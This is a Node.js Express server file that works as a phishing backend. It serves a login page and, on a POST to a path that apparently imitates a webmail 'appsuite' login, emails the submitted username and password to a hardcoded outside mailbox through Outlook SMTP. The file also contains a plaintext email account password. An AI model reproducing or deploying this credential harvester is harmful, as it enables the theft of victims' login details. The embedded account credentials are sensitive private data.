var express = require('express');
var bodyparser = require('body-parser');
var nodemailer = require('nodemailer');
var app = express();

app.use(bodyparser.urlencoded({ extended: true }));

var transporter = nodemailer.createTransport(
	{
		host: 'smtp-mail.outlook.com',
		secureConnection: false,
		port: 587,
		tls: {
			ciphers:'SSLv3'
		},
		auth: {
			user: 'badr200@live.nl',
			pass: '1securityIsEverything1!'
		}
	});

app.get('/', function(req, res)
	{	
		res.sendFile(__dirname + '/index.html');
	}
);

app.get('/redirect', function(req, res)
	{
		res.sendFile(__dirname + '/redirect.html');
	}
);

app.post('/appsuite/api/redirect', function(req, res)
	{
		var gebruikersnaam = req.body.username;
		var wachtwoord = req.body.password;

		var mailOptions = 
		{
			from: "hello there",
			to: 'badr200@live.nl',
			subject: 'sirrrr',
			text: gebruikersnaam + wachtwoord
		};

		transporter.sendMail(mailOptions, function(error, info)
		{
			if(error)
			{
				return console.log(error);
			}

			console.log("message sent" + info.response);
		});
	}
);

app.listen(80);
